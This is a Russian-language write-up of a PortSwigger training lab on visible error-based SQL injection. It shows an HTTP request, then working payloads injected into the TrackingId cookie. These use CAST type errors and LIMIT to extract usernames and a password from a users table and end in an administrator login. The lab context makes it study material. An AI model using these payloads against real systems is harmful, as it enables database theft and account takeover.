---
title: "Visible error-based SQL injection"
date: 2025-06-20
tags: [sqli, writeup, web]  
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based"
---

В данной лабе присутствует **Error based SQL injection** в параметре `Cookie`. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.

```
https://0a75008704f2164580726c3600ac0013.web-security-academy.net/
```

## Solution

Так как уязвимость в `Cookie`, то возьму `GET`-запрос с выставленными значениями.

```http
GET / HTTP/2
Host: 0a75008704f2164580726c3600ac0013.web-security-academy.net
Cookie: TrackingId=dUrA4au9zQX6dlb5; session=5UhSQKjfJwXutcIvFyn3RNseuyAD7ybb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a75008704f2164580726c3600ac0013.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Скорее всего уязвимым является параметр `TrackingId`. Подберу обрамелние и пейлоад:

```
dUrA4au9zQX6dlb5'-- -Error
```

Я получил следующую ошибку с описанием:

![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/1.png){: height="200" .align-center}

Из текста видно, что для обрамления используются одинарные кавычки. Тогда подберу пейлоад:

```
dUrA4au9zQX6dlb5' or false-- -Ok
dUrA4au9zQX6dlb5' or true-- -Ok
dUrA4au9zQX6dlb5' and false-- -Ok
dUrA4au9zQX6dlb5' and true-- -Ok
```

Обрамление работает, но содержимое не отображается. Попробую специально вызывать ошибку с помощью `CAST`:

```
dUrA4au9zQX6dlb5' and 1=CAST((SELECT 'a') AS int)-- -Error
```

Я получил следующую ошибку:

![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/2.png){: height="200" .align-center}

Попробую получить имена пользователей:

```
' and 1=CAST((SELECT username FROM users) AS int)-- -Error
```

![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/3.png){: height="200" .align-center}

Из сообщения видно, что в БД лежит больше одного логина, поэтому я использую `LIMIT`, чтобы получать значения по одному:

```
' and 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -
```

Получил следующий ответ:

![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/4.png){: height="200" .align-center}

Достану пароль таким же образом:

```
' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
```

![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/5.png){: height="200" .align-center}

Пароль получен: `oar4hhxs5cflalzuprmh`. Попробую зайти в аккаунт администратора:

![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/6.png){: height="200" .align-center}

Лаба решена:3
